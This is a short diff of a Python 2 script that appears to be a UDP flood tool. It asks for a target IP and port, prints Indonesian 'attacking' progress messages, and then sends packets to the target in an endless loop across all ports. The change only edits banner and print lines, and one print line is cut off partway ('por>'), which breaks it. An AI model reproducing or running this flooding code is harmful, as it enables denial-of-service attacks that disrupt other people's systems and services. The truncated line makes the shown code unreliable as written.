@@ -30,29 +30,23 @@ print ("\033[1;36mGithub \033[1;32m: \033[1;35mhttps://github.com/MrVirusSpm-07"
 print ("\033[1;36mWhasap \033[1;32m: \033[1;35m+6281574614665")
 
 time.sleep(1)
-ip = raw_input("iP Target : ")
+ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
+os.system("figlet Attack")
 time.sleep(1)
-
-os.system("figlet Attack ")
+print "[menyerang........] 1% "
 time.sleep(1)
-print ("[menyerang......] 2%   ")
+print "[menyerang........] 2%"
 time.sleep(1)
-print ("[menyerang......] 4℅  ")
-time.sleep(1)
-print ("[menyerang......] 6℅  ")
-time.sleep(1)
-print ("[menyerang......] 8℅  ")
-time.sleep(1)
-print ("[menyerang......] 10℅ ")
+print "[menyerang........] 3%"
 time.sleep(1)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print ("Sent %s packet to %s throught port:%s")%(sent,ip,port)
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,por>
      if port == 65534:
        port = 1
